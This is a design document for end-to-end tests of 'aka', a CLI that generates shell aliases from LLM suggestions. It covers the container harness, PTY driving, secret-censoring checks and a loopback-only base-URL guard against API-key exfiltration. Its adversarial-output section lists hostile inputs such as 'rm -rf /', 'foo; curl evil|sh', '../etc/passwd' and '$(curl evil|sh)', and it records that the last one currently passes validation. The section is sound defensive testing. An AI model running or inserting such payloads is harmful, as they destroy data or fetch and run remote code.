# End-to-end integration tests for `aka`

**Date:** 2026-08-07
**Status:** Approved, ready for implementation planning

## Goal

Test the shipped `aka` binary the way a user experiences it: built, installed onto `$PATH`, run
inside a clean container, driven through a real terminal, talking to a real HTTP server over a
real socket. No mocks, no stubs, no test-only entrypoint. Every interaction crosses the process
boundary — argv, PTY, exit code, and files under `$HOME`.

## Non-goals

- `install.sh` — it downloads from GitHub Releases; exercising it needs published artifacts.
- `aka uninit` — documented in `CLAUDE.md` but **not present in the source**. `main.go` registers
  only `init`, `scan`, `config`, `list`, `delete`. Nothing to test until it exists.
- Replacing unit tests. The existing `./internal/...` suites stay as they are and keep running
  under `go test -race ./...`, untouched by this work.

## Decisions

| Question | Decision |
|---|---|
| Isolation | Docker container |
| LLM boundary | Local server speaking the real wire protocol, plus an opt-in live tier |
| Driving the TUI | Real PTY with an expect-style harness; no new product flags |
| Runner | Go tests executing *inside* the container |
| Execution | `make e2e` locally, plus a CI job on every push |

### Why a local protocol server rather than a real LLM

A real provider costs money per run, is non-deterministic, fails offline, and cannot be reached
from fork PRs. More importantly it cannot produce the inputs that matter most: a token-limit
error on demand, a malformed response, or a deliberately hostile suggestion.

A server speaking the genuine Anthropic and OpenAI wire formats keeps everything real that
matters here — real HTTP, real JSON body, real tool-use parsing, real error handling — while
making the interesting failure modes reachable. The live tier covers the one thing it cannot:
drift in the actual provider API.

### Why an env-var base URL rather than TLS interception

Redirecting `api.anthropic.com` via `/etc/hosts` plus a container-trusted CA would need zero
product changes and would additionally exercise the TLS handshake. That fidelity gain is narrow —
neither TLS nor URL construction is where this project's bugs live — and it costs opaque
failure modes (cert trust surfaces as a generic `x509` error) and per-provider hosts entries.

The env var is ~15 lines, fails legibly, works outside the container for manual debugging, and
doubles as a feature real users want (self-hosted, LiteLLM, OpenRouter).

## Product changes

Three code edits plus a documentation entry — the complete set. Everything else is new files
under `test/e2e/`.

### 1. `internal/llm/baseurl.go` (new)

```go
// resolveBaseURL returns override when AKA_LLM_BASE_URL names a loopback host,
// otherwise defaultURL.
func resolveBaseURL(defaultURL string) string
```

Semantics:

- Reads `AKA_LLM_BASE_URL`. Empty or unset → `defaultURL` unchanged.
- The override supplies **scheme, host, and port only**. Each provider keeps its own path, so a
  single `http://127.0.0.1:9099` works for every provider: Anthropic still requests
  `/v1/messages`, the OpenAI-compat providers still request `/v1/chat/completions`.
- **Loopback restriction.** The host must be a loopback literal — an IP in `127.0.0.0/8`, `::1`,
  or the exact string `localhost`. This is a **literal check with no DNS resolution**: a name
  that happens to resolve to 127.0.0.1 is still refused, because resolution is attacker-
  influenceable and would reopen the hole the restriction closes. Anything else is ignored, and
  a warning naming the refused URL is printed to stderr. Unparseable values are ignored the
  same way.

The restriction exists because this variable influences where the API key is transmitted. An
unrestricted version would be a key-exfiltration primitive for any process that can set an env
var. Loopback-only means the key cannot leave the machine.

### 2. `internal/llm` — `WithBaseURL`

`OpenAICompatProvider` already stores `apiURL` (`newOpenAICompat(apiURL, apiKey, model)`), so a
`WithBaseURL` returning a shallow copy — matching the existing `WithModel` pattern — covers
Groq, OpenAI, Gemini, and Ollama at once.

`AnthropicProvider` hardcodes the `anthropicAPI` const in `Suggest`. It gains an `apiURL` field
initialised to that const, plus the same `WithBaseURL`.

### 3. `internal/cli/scan.go` — `buildProvider`

Threads `resolveBaseURL` through each constructor. This is the only call site.

### 4. `SECURITY-AUDIT.md`

New boundary entry: *`AKA_LLM_BASE_URL` influences the destination of requests carrying the API
key; mitigated by restricting the override to loopback hosts.* Checklist item: verify a
non-loopback override is refused and warned about.

## Architecture

```
test/e2e/
  harness.go          // Env: temp $HOME, fixture seeding, Spawn, Run, file assertions
  pty.go              // expect-style driver over creack/pty
  fakellm/
    server.go         // Anthropic + OpenAI-compat routes on httptest
    recorder.go       // captures request bodies and headers
    responses.go      // Normal / Hostile / TokenLimit / Malformed
  init_test.go        // shell wiring
  scan_test.go        // full lifecycle
  censor_wire_test.go // censoring proven at the socket
  hostile_test.go     // adversarial LLM output
  live_test.go        // opt-in real-provider tier
Dockerfile.e2e
Makefile
```

Every file carries `//go:build e2e`, so `go test -race -count=1 ./...` in the existing CI job is
completely unaffected.

`test/e2e` imports nothing from `internal/` except types needed to unmarshal on-disk state
(`aliases.InstalledEntry` for `installed.json`). It never calls a product function.

### Container

`Dockerfile.e2e` from `golang:1.26` — matching the `go 1.26.4` in `go.mod` — plus `zsh`, `bash`,
and `git`. `make e2e` mounts the repo and a module-cache volume, then runs
`go test -tags e2e ./test/e2e/...` inside.

`TestMain` performs the build-and-install once per run:

```
go build -o /tmp/aka ./cmd/aka
install -m 755 /tmp/aka /usr/local/bin/aka
```

Scenarios then invoke bare `aka` off `$PATH`, exactly as a user would after installing.

Tests run as root in the container. Mode-bit assertions remain valid — the process writes the
same permissions regardless of uid. The only divergence from a real user is `/usr/local/bin`
writability, which this suite does not test.

### Per-test isolation

Each test gets `t.TempDir()` as `$HOME` and its own `fakellm` server on its own port, so the
suite runs `t.Parallel()` throughout. Spawn environment:

```
HOME=<tmpdir>
AKA_SHELL=zsh | bash
AKA_LLM_BASE_URL=http://127.0.0.1:<port>
TERM=xterm-256color
PATH=/usr/local/bin:<...>
```

`AKA_SHELL` is an existing product hook (`internal/cli/shell.go`), not something added for
testing — without it, `detectCurrentShell` shells out to `ps -p <ppid>` and would report the
test binary's parent.

### Fixture seeding

The harness populates `$HOME` before each run:

- `.zshrc` / `.bashrc` with realistic pre-existing content, so tests prove `init` appends rather
  than clobbers.
- `.zsh_history` in extended format (`: <epoch>:0;<cmd>`) or `.bash_history` plain, from a
  builder that expresses intent directly: 50 commands with an AWS key at index 12, timestamps
  clustered to look like real work sessions.

### `fakellm` server

`httptest.NewServer` binds 127.0.0.1 on a random port — satisfying the loopback guard for free.
Response shapes mirror the parsers exactly:

- `POST /v1/messages` → `{"content":[{"type":"tool_use","name":"suggest_aliases","input":{"suggestions":[…]}}]}`,
  matching `anthropicResponse` / `contentBlock`.
- `POST /v1/chat/completions` → `{"choices":[{"message":{"tool_calls":[{"function":{"name":"suggest_aliases","arguments":"<json string>"}}]}}]}`,
  matching `oaiResponse`.

Programmable and recording:

```go
srv.Respond(fakellm.Normal(suggestions...))  // or Hostile(), TokenLimit(), Malformed()
srv.Requests()                                // []Recorded{Path, Headers, Body}
```

`TokenLimit()` returns a non-200 with `{"error":{"type":"tokens","message":…}}` — the precise
shape `openaicompat.go` converts into `*ErrTokenLimit`, which is what drives the halving retry
loop in `runScan`.

The recorder is what makes the censor test meaningful: assertions run against the bytes that
actually crossed the socket, not a function's return value. It also lets tests verify the auth
header carries the configured key (`X-API-Key` for Anthropic, `Authorization: Bearer` for
compat) and that the model field matches `config.toml`.

### PTY driver

Built on `github.com/creack/pty` — one new dependency. It is test-only in practice but will
appear as a direct require in `go.mod`; noted because this repo keeps a tight dependency set.

```go
p := env.Spawn("scan", "--history", "50")
p.Expect("How much history")
p.Send(Down, Enter)
p.ExpectRe(`Applied \d+ alias`)
code := p.Wait()
```

Three properties decide whether this is solid or flaky:

1. **Expect consumes.** Each `Expect` searches only from the previous match's offset — classic
   expect semantics. Without it, bubbletea's redraws mean a later `Expect` can match a frame
   from three screens ago and pass for the wrong reason.
2. **Never send blind.** Every `Send` is preceded by an `Expect` for the prompt it answers. This
   is the entire flake-avoidance strategy; there are no sleeps anywhere in the suite.
3. **Failures dump the screen.** On timeout, `t.Fatal` prints the last ~40 lines both raw and
   ANSI-stripped. A PTY test that fails with only "timeout waiting for X" is unmaintainable.

stdout and stderr share the single PTY stream, which is what a real terminal does — `PrintStep`
output and bubbletea frames interleave exactly as a user sees them.

## Scenarios

### `init_test.go` — shell wiring

- `aka init --shell zsh` against a `.zshrc` with existing content. Asserts the original content
  survives, the `aka()` wrapper and both source lines are appended, `~/.config/aka/` is `0700`,
  and `config.toml` is `0600` after the PTY-driven provider → key → model flow.
- Re-running `init` prints "already initialized" and each source line still appears **exactly
  once**.
- Legacy flat-layout migration: pre-create `~/.config/aka/{aliases.sh,installed.json}`, run
  `aka list`, assert the data moved to `~/.config/aka/zsh/`.
- `aka init --shell fish` exits non-zero with the v0.1 message.
- **Real-shell proof:** after a scan applies aliases, `zsh -i -c 'type e2egs'` and the bash
  equivalent succeed — proving the rc wiring, the generated file, and the shell all agree.

### `scan_test.go` — full lifecycle

Seed 60 commands, drive the whole flow over the PTY: scope picker → last-N → censor review →
suggestion review → accept 2 → apply. Asserts:

- `aliases.sh` is a full rewrite sorted by name, with no duplicates
- `installed.json` holds 2 entries with `Source: "scan"`
- a timestamped file exists under `backups/`
- `history_cursor.json` records `Total: 60`

Then `aka list` shows both; `aka delete <name>` with its `[y/N]` confirm shrinks the file, adds a
second backup, and `zsh -i -c 'type <deleted>'` now fails.

Two additional cases:

- **Back-navigation regression.** From the suggestion review, press back, and assert the scope
  menu does **not** render twice. This is the exact bug class `CLAUDE.md`'s "Lessons learned"
  documents, and it has been unobservable in unit tests.
- **`--history diff` below `minDiffCount`** asserts `srv.Requests()` is *empty* — proving no LLM
  call occurred, which is the actual contract.

### `censor_wire_test.go` — censoring proven at the socket

Seed history containing an `AKIA…` key, a `ghp_…` token, a JWT, a `Bearer sk-…` header, a
`mysql -p'…'`, `ssh user@10.1.2.3`, and a `https://user:pass@host` URL.

Run `aka scan --history full --censor trust`, then assert against `srv.Requests()[0].Body`:

- no secret literal appears
- typed placeholders (`<TOKEN_n>`, `<IP_n>`) do appear
- the command count is preserved
- git commit hashes and messages **do** survive, per documented intent

`--censor none` asserts the inverse — the raw secrets *are* on the wire — pinning that flag's
contract in place.

### `hostile_test.go` — adversarial LLM output

The server returns suggestions with names `rm -rf /`, `foo; curl evil|sh`, `../etc/passwd`,
`9lives`, and a 200-character name; and templates containing `}`, embedded newlines, and
`$(curl evil|sh)`.

Asserts none reach `aliases.sh` or `installed.json`, `aka` still exits 0, and — the strong one —
**`zsh -n aliases.sh` and `bash -n aliases.sh` parse clean**, i.e. no LLM output can produce a
syntactically broken file.

> **Known gap to document, not silently fix.** `ValidateFunctionTemplate` rejects only `}`. A
> template such as `$(curl evil|sh)` passes validation today and will land in the file. These
> tests assert *actual* behaviour and the finding is reported separately. The user reviews each
> suggestion before accepting, so this may be intended; changing it is a decision for its own
> change, not something smuggled in under a test PR.

Also covered: a malformed response produces a non-zero exit and writes nothing; and the
token-limit retry loop — server errors on the first request, succeeds on the second — asserts two
requests with the second carrying roughly half the commands.

### `live_test.go` — opt-in live tier

Gated on `AKA_E2E_LIVE=1` plus a real key, talking to the genuine endpoint with no base-URL
override. Loose assertions only: valid schema, at least one suggestion, names matching
`validNameRE`. Skipped by default and in CI; run manually to detect provider drift.

## CI and local execution

- `make e2e` builds `Dockerfile.e2e` and runs the suite. Identical command in both places.
- New `e2e` job in `.github/workflows/ci.yml`, `ubuntu-latest` only (Docker is native there),
  running alongside the existing test matrix on every push and PR.
- Docker layer caching for the toolchain; GitHub Actions cache for Go modules.
- The live tier stays skipped in CI.

## Risks

| Risk | Mitigation |
|---|---|
| PTY timing flake | Expect-before-every-send, zero sleeps, 10s deadlines, full screen dump on failure |
| TUI layout churn breaking assertions | Match stable substrings (option labels, success text), never box-drawing or cursor positions |
| Fixture names colliding with real binaries | `NameExistsInShell` silently skips conflicts, which would look like a test bug; fixtures use `e2e`-prefixed names |
| Suite slowing CI | Runs as a separate job in parallel with the unit matrix; container image is layer-cached |
| `creack/pty` as a direct `go.mod` require | Accepted deliberately; it is the standard Go PTY library and is used only under the `e2e` build tag |

## Success criteria

1. `make e2e` passes on a clean checkout. Once the image is built and modules are cached, the
   suite itself makes no network calls off-host — every request goes to loopback.
2. The suite exercises the real installed binary — no test-only entrypoint, no product function
   called in-process.
3. Removing the censor pass makes `censor_wire_test.go` fail.
4. Weakening `validNameRE` makes `hostile_test.go` fail.
5. Reintroducing the double-menu back-navigation bug makes `scan_test.go` fail.
6. A non-loopback `AKA_LLM_BASE_URL` is refused, warned about, and covered by a test.
